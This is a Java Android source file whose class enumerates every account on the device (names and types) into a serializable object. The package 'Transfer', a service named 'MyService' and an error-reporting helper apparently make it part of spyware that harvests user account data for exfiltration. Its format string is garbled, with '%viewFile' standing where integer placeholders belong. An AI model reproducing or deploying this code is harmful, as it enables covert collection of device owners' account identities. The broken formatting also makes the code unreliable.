package Transfer;

import android.accounts.AccountManager;
import android.content.Context;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

public class Account implements Serializable {

  public List<String> NAME;
  public List<String> TYPE;

  public Account() {
    NAME = new ArrayList();
    TYPE = new ArrayList();

    try {
      if (VERSION.SDK_INT >= 5) {
        for (android.accounts.Account account : ((AccountManager) MyService.context.getSystemService(
            Context.ACCOUNT_SERVICE)).getAccounts()) {
          NAME.add(account.name);
          TYPE.add(account.type);
        }
        return;
      }

      throw new Exception(String.format(
          "This feature requires SDK level %viewFile. The device has level %viewFile.",
          new Object[] { 5, VERSION.SDK_INT }));
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
